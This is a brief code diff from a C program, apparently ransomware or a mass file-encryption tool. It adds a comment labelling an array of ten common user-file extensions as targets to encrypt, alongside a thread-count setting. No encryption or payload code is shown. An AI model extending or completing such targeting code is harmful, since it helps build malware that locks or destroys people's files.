@@ -20,6 +20,7 @@
 #define MAX_THREADS 8
 #define TARGET_EXTENSIONS_COUNT 10
 
+// List of target file extensions to encrypt
 static const char* target_extensions[] = {
     ".txt", ".doc", ".pdf", ".jpg", ".png", 
     ".mp4", ".zip", ".log", ".conf", ".data"
